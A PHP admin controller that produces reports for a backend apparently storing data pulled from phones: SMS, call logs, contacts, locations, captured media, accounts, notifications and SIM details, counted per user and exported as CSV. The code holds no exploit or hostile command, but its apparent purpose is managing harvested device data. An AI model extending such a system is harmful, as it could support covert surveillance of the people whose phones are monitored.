<?php

namespace App\Controllers\admin;

class Reports extends BaseAdminController
{
    public function index()
    {
        $db = $this->getDb();

        $totalUsers = $db->table('users')->where('deleted_at IS NULL')->countAllResults();
        $usersWithData = $db->table('uploaded_files')->select('token_owner_id')->groupBy('token_owner_id')->countAllResults();
        $totalUploads = $db->table('uploaded_files')->countAllResults();
        $totalStorage = $db->table('uploaded_files')->selectSum('file_size_bytes')->get()->getRow()->file_size_bytes ?? 0;

        $dataTypeCounts = [];
        $dataTables = [
            'SMS' => 'tbl_sms', 'Calls' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Files' => 'tbl_device_files', 'Uploads' => 'uploaded_files',
        ];
        foreach ($dataTables as $label => $table) {
            $dataTypeCounts[] = [
                'label' => $label,
                'count' => $db->table($table)->countAllResults(),
            ];
        }

        return $this->renderView('admin/reports/index', [
            'pag' => 'admin-reports',
            'total_users' => $totalUsers,
            'users_with_data' => $usersWithData,
            'total_uploads' => $totalUploads,
            'total_storage' => $totalStorage,
            'data_type_counts' => $dataTypeCounts,
        ]);
    }

    public function user_activity()
    {
        $db = $this->getDb();
        $users = $db->table('users')
            ->select('users.id, users.username, auth_identities.secret as email')
            ->join('auth_identities', "auth_identities.user_id = users.id AND auth_identities.type = 'email_password'", 'left')
            ->where('users.deleted_at IS NULL')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/user_activity', [
            'pag' => 'admin-reports-user-activity',
            'users' => $users,
        ]);
    }

    public function user_activity_report(string $username)
    {
        $db = $this->getDb();

        $user = $db->table('users')
            ->where('username', $username)
            ->where('deleted_at IS NULL')
            ->get()
            ->getRowArray();

        if (!$user) {
            return redirect()->to('admin/reports/user-activity')->with('error', 'User not found.');
        }

        $userId = $user['id'];

        $dataTables = [
            ['label' => 'SMS',           'table' => 'tbl_sms',           'icon' => 'fa-sms'],
            ['label' => 'Call Logs',     'table' => 'tbl_logs',          'icon' => 'fa-phone'],
            ['label' => 'Contacts',      'table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
            ['label' => 'Apps',          'table' => 'tbl_apps',          'icon' => 'fa-th'],
            ['label' => 'Locations',     'table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
            ['label' => 'Activities',    'table' => 'tbl_activity',      'icon' => 'fa-running'],
            ['label' => 'Files',         'table' => 'tbl_device_files',  'icon' => 'fa-file'],
            ['label' => 'Network',       'table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
            ['label' => 'Accounts',      'table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
            ['label' => 'Calendar',      'table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
            ['label' => 'App Usage',     'table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
            ['label' => 'Notifications',  'table' => 'tbl_notifications', 'icon' => 'fa-bell'],
            ['label' => 'Bluetooth',     'table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
            ['label' => 'Sensors',       'table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
            ['label' => 'Security',      'table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
            ['label' => 'Media',         'table' => 'tbl_captured_media','icon' => 'fa-camera'],
            ['label' => 'SIM',           'table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
            ['label' => 'Uploads',       'table' => 'uploaded_files',    'icon' => 'fa-upload'],
        ];
        $counts = [];
        foreach ($dataTables as $item) {
            $ownerCol = ($item['table'] === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
            $counts[] = [
                'label' => $item['label'],
                'icon'  => $item['icon'],
                'count' => $db->table($item['table'])->where($ownerCol, $userId)->countAllResults(),
            ];
        }

        $loginHistory = $db->table('auth_logins')
            ->where('user_id', $userId)
            ->orderBy('date', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $actions = $db->table('tbl_user_actions')
            ->where('user_id', $userId)
            ->orderBy('created_at', 'DESC')
            ->limit(20)
            ->get()
            ->getResultArray();

        $uploadsPerDay = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count")
            ->where('token_owner_id', $userId)
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 30 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/user_activity_report', [
            'pag' => 'admin-reports-user-activity',
            'report_user' => $user,
            'data_counts' => $counts,
            'login_history' => $loginHistory,
            'actions' => $actions,
            'uploads_per_day' => $uploadsPerDay,
        ]);
    }

    public function data_usage()
    {
        $db = $this->getDb();

        $dataTables = [
            'SMS'           => ['table' => 'tbl_sms',           'icon' => 'fa-sms'],
            'Call Logs'     => ['table' => 'tbl_logs',          'icon' => 'fa-phone'],
            'Contacts'      => ['table' => 'tbl_contacts',      'icon' => 'fa-address-book'],
            'Apps'          => ['table' => 'tbl_apps',          'icon' => 'fa-th'],
            'Locations'     => ['table' => 'tbl_location',      'icon' => 'fa-map-marker-alt'],
            'Activities'    => ['table' => 'tbl_activity',      'icon' => 'fa-running'],
            'Files'         => ['table' => 'tbl_device_files',  'icon' => 'fa-file'],
            'Device Context' => ['table' => 'tbl_device_context','icon' => 'fa-cog'],
            'Network'       => ['table' => 'tbl_network_info',  'icon' => 'fa-wifi'],
            'Accounts'      => ['table' => 'tbl_accounts',      'icon' => 'fa-user-circle'],
            'Calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar'],
            'App Usage'     => ['table' => 'tbl_app_usage',     'icon' => 'fa-clock'],
            'Notifications' => ['table' => 'tbl_notifications', 'icon' => 'fa-bell'],
            'Bluetooth'     => ['table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth'],
            'Sensors'       => ['table' => 'tbl_sensor_profile','icon' => 'fa-microchip'],
            'Security'      => ['table' => 'tbl_security_audit','icon' => 'fa-shield-alt'],
            'Media'         => ['table' => 'tbl_captured_media','icon' => 'fa-camera'],
            'SIM'           => ['table' => 'tbl_sim_configs',   'icon' => 'fa-sim-card'],
            'Uploads'       => ['table' => 'uploaded_files',    'icon' => 'fa-upload'],
        ];

        $users = $db->table('users')
            ->select('users.id, users.username')
            ->where('users.deleted_at IS NULL')
            ->get()
            ->getResultArray();

        $userData = [];
        $grandTotal = 0;
        $allTotals = [];

        foreach ($dataTables as $label => $info) {
            $allTotals[$label] = 0;
        }

        foreach ($users as $u) {
            $total = 0;
            $categories = [];
            foreach ($dataTables as $label => $info) {
                $table = $info['table'];
                $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                $count = $db->table($table)->where($ownerCol, $u['id'])->countAllResults();
                $categories[$label] = $count;
                $total += $count;
                $allTotals[$label] += $count;
            }
            if ($total > 0) {
                $userData[] = [
                    'username'   => $u['username'],
                    'total'      => $total,
                    'categories' => $categories,
                ];
            }
            $grandTotal += $total;
        }
        usort($userData, fn($a, $b) => $b['total'] - $a['total']);

        return $this->renderView('admin/reports/data_usage', [
            'pag'         => 'admin-reports-data-usage',
            'data_tables' => $dataTables,
            'user_data'   => $userData,
            'all_totals'  => $allTotals,
            'grand_total' => $grandTotal,
        ]);
    }

    public function performance()
    {
        $db = $this->getDb();

        $totalQueries = 0;
        $queryTime = 0;

        $tableSizes = [];
        foreach ($db->listTables() as $table) {
            $status = $db->query("SHOW TABLE STATUS LIKE '{$table}'")->getRow();
            $size = ($status->Data_length ?? 0) + ($status->Index_length ?? 0);
            if ($size > 0) {
                $tableSizes[] = ['name' => $table, 'size' => $size, 'rows' => $status->Rows ?? 0];
            }
        }
        usort($tableSizes, fn($a, $b) => $b['size'] - $a['size']);

        $errorRate = $db->table('tbl_user_actions')
            ->select("COUNT(*) as total, SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed")
            ->get()
            ->getRow();

        $uploadsByDay = $db->table('uploaded_files')
            ->select("DATE(uploaded_at) as date, COUNT(*) as count, AVG(file_size_bytes) as avg_size")
            ->where('uploaded_at >= DATE_SUB(NOW(), INTERVAL 7 DAY)')
            ->groupBy('DATE(uploaded_at)')
            ->get()
            ->getResultArray();

        return $this->renderView('admin/reports/performance', [
            'pag' => 'admin-reports-performance',
            'table_sizes' => $tableSizes,
            'total_db_size' => array_sum(array_column($tableSizes, 'size')),
            'total_records' => array_sum(array_column($tableSizes, 'rows')),
            'error_rate' => $errorRate,
            'uploads_by_day' => $uploadsByDay,
            'php_version' => PHP_VERSION,
            'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
            'memory_limit' => ini_get('memory_limit'),
            'max_upload' => ini_get('upload_max_filesize'),
            'max_post' => ini_get('post_max_size'),
            'max_execution' => ini_get('max_execution_time'),
        ]);
    }

    public function generate()
    {
        $db = $this->getDb();

        $users = $db->table('users')
            ->select('users.id, users.username')
            ->where('users.deleted_at IS NULL')
            ->orderBy('users.username', 'ASC')
            ->get()
            ->getResultArray();

        if ($this->request->getMethod() === 'POST') {
            $dateFrom  = $this->request->getPost('date_from');
            $dateTo    = $this->request->getPost('date_to');
            $dataTypes = $this->request->getPost('data_types') ?? [];
            $userId    = $this->request->getPost('user_id');

            $tableMap = [
                'sms'           => ['table' => 'tbl_sms',           'icon' => 'fa-sms',           'label' => 'SMS'],
                'calls'         => ['table' => 'tbl_logs',          'icon' => 'fa-phone',         'label' => 'Call Logs'],
                'contacts'      => ['table' => 'tbl_contacts',      'icon' => 'fa-address-book',  'label' => 'Contacts'],
                'apps'          => ['table' => 'tbl_apps',          'icon' => 'fa-th',            'label' => 'Apps'],
                'locations'     => ['table' => 'tbl_location',      'icon' => 'fa-map-marker-alt','label' => 'Locations'],
                'activities'    => ['table' => 'tbl_activity',      'icon' => 'fa-running',       'label' => 'Activities'],
                'notifications' => ['table' => 'tbl_notifications', 'icon' => 'fa-bell',          'label' => 'Notifications'],
                'accounts'      => ['table' => 'tbl_accounts',      'icon' => 'fa-user-circle',   'label' => 'Accounts'],
                'bluetooth'     => ['table' => 'tbl_bluetooth',     'icon' => 'fa-bluetooth',     'label' => 'Bluetooth'],
                'calendar'      => ['table' => 'tbl_calendar_events','icon' => 'fa-calendar',     'label' => 'Calendar'],
                'uploads'       => ['table' => 'uploaded_files',    'icon' => 'fa-upload',        'label' => 'Uploads'],
            ];

            $results = [];
            $grandTotal = 0;
            foreach ($dataTypes as $type) {
                if (!isset($tableMap[$type])) continue;
                $info = $tableMap[$type];
                $table = $info['table'];
                $dateCol = $type === 'uploads' ? 'uploaded_at' : 'created_at';
                $query = $db->table($table)
                    ->where("{$dateCol} >=", $dateFrom ?: '1970-01-01')
                    ->where("{$dateCol} <=", $dateTo ?: date('Y-m-d'));
                if ($userId && $userId !== 'all') {
                    $ownerCol = ($table === 'uploaded_files') ? 'token_owner_id' : 'owner_id';
                    $query->where($ownerCol, $userId);
                }
                $count = $query->countAllResults();
                $results[] = [
                    'type'  => $type,
                    'label' => $info['label'],
                    'icon'  => $info['icon'],
                    'count' => $count,
                ];
                $grandTotal += $count;
            }

            $selectedUser = null;
            if ($userId && $userId !== 'all') {
                foreach ($users as $u) {
                    if ((string)$u['id'] === $userId) {
                        $selectedUser = $u;
                        break;
                    }
                }
            }

            return $this->renderView('admin/reports/generate', [
                'pag'           => 'admin-reports-generate',
                'results'       => $results,
                'grand_total'   => $grandTotal,
                'date_from'     => $dateFrom,
                'date_to'       => $dateTo,
                'selected_types'=> $dataTypes,
                'selected_user' => $selectedUser,
                'selected_user_id' => $userId,
                'users'         => $users,
            ]);
        }

        return $this->renderView('admin/reports/generate', [
            'pag'             => 'admin-reports-generate',
            'results'         => null,
            'grand_total'     => 0,
            'date_from'       => date('Y-m-d', strtotime('-30 days')),
            'date_to'         => date('Y-m-d'),
            'selected_types'  => [],
            'selected_user'   => null,
            'selected_user_id'=> 'all',
            'users'           => $users,
        ]);
    }

    public function export()
    {
        $db = $this->getDb();
        $type = $this->request->getPost('type') ?? 'all';
        $dateFrom = $this->request->getPost('date_from') ?? '1970-01-01';
        $dateTo = $this->request->getPost('date_to') ?? date('Y-m-d');

        $csv = "Type,Table,Count\n";
        $tableMap = [
            'SMS' => 'tbl_sms', 'Call Logs' => 'tbl_logs', 'Contacts' => 'tbl_contacts',
            'Apps' => 'tbl_apps', 'Locations' => 'tbl_location', 'Activities' => 'tbl_activity',
            'Device Files' => 'tbl_device_files', 'Uploaded Files' => 'uploaded_files',
        ];

        foreach ($tableMap as $label => $table) {
            $count = $db->table($table)->countAllResults();
            $csv .= "{$label},{$table},{$count}\n";
        }

        return $this->response
            ->setHeader('Content-Type', 'text/csv')
            ->setHeader('Content-Disposition', 'attachment; filename="report_' . date('Y-m-d') . '.csv"')
            ->setBody($csv);
    }
}
